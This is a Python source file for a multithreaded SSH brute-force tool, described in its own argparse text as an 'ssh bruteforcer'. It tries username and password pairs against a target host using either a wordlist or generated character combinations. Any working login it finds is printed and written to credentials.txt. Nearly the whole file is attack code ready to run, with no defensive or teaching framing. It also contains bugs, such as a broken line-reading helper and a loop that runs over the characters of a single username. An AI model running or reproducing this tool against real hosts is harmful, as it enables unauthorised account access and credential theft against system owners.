import paramiko
import socket
import time
from colorama import init , Fore as fo
import itertools
import string
import argparse
from threading import Thread
import queue
import sys
import contextlib
import os

red = fo.RED
green = fo.GREEN
blue = fo.BLUE
reset = fo.RESET

q = queue.Queue()

@contextlib.contextmanager
def suppress_stderr():
    with open(os.devnull,'w') as devnull:
        old_stderr = sys.stderr
        sys.stderr = devnull
        try:
            yield
        finally:
            sys.stderr = old_stderr

def ssh_connected(host,user,pwd,retry_count = 3,retry_delay = 10):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=host,
            username=user,
            password=pwd,
            timeout=1,
            auth_timeout=1,
            banner_timeout=1
            )
    except socket.timeout:
        print(f"{red}[-]Host:{host} is unreachable.Time out.{reset}")
        time.sleep(0.05)
        return False
    except paramiko.AuthenticationException:
        print(f"{red}[-]Invad Credentials for host: {host} user:{user} pass: {pwd} {reset}")
    except paramiko.ssh_exception.SSHException as e:
        if retry_count>0:
            print(f"{blue}[*]Exception : {str(e)}{reset}")
            print(f"{blue}[*]Retrying{reset}")
            time.sleep(retry_delay)
            return ssh_connected(host,user,pwd,retry_count-1,retry_delay*2)
    except paramiko.SSHException as e:
        if retry_count>0:
            print(f"{blue}[*]Exception : {str(e)}{reset}")
            print(f"{blue}[*]Retrying{reset}")
            time.sleep(retry_delay)
            return ssh_connected(host,user,pwd,retry_count-1,retry_delay*2)
        
    except Exception as e:
        print(f'unforseen error : {str(e)}')
    else:
        print(f"{green}[+]Found host : {host} \n\t username : {user} \n\tpassword : {pwd}{reset}")
        return True
    
def passlist_resolver(passlist):
    with open(passlist,'r') as f:
        for line in f:
            yield line.strip()

def fetch_lines(file):
    with open(file,'r') as f:
        lines = ()
        for line in f:
            lines = f.readline()
        return lines

def gen_pass(min,max,chars):
    for length in range(min,max+1):
        for passwords in itertools.product(chars,repeat = length ):
            yield ''.join(passwords)

def worker(host):
    while not q.empty():
        username,password = q.get()
        if ssh_connected(host,username,password):
            with open('credentials.txt','w') as f:
                f.write(f"{username}@{host}:{password}")
            q.queue.clear()
            break
        q.task_done()

if __name__=="__main__":
    parser = argparse.ArgumentParser(description = "ssh bruteforcer")
    parser.add_argument('host',help="Hostname")

    parser.add_argument('-u','--user',help="username",default = None)
    parser.add_argument('-U','--userlist',help="username list to use",default = None)

    parser.add_argument('-p','--passlist',help="password wortdlist",default=None)

    parser.add_argument('-g','--generate',action='store_true',help="generate passwords",default = None)
    parser.add_argument('-max',type = int,help="maximum chars for generation",default = 1)
    parser.add_argument('-min',type = int,help="minium chars for generation",default = 1)
    parser.add_argument('-c','--charlist',help = "character list",default = string.ascii_letters+string.digits)

    parser.add_argument('-t','--threads',type = int, help = 'no of threads to use',default = 4)

    args = parser.parse_args()
    
    chars = args.charlist
    user = args.user
    min = args.min
    max = args.max
    userlist = args.userlist
    threads = args.threads
    if not user and not userlist and not args.generate:
        print("No username(s) provided")
        sys.exit(1)

    if args.passlist:
        passes = passlist_resolver(args.passlist)
        #for password in passes:
         #   if ssh_connected(host,user,password):
          #      open('credentials.txt','w').write(f'{user}@{host}:{password}')
           #     break
    elif args.generate:
        passes = gen_pass(min,max,chars)
    else:
        print('passwords not provided')
        sys.exit(1)

    if userlist:
        users = fetch_lines(userlist)
    else :
        users = user
    
    for u in users:
        for p in passes:
            q.put((u,p))
    
    host = args.host
    for _ in range(threads):
        thread = Thread(target=worker,args = (host,))
        thread.daemon = True
        thread.start()
    
    q.join()

    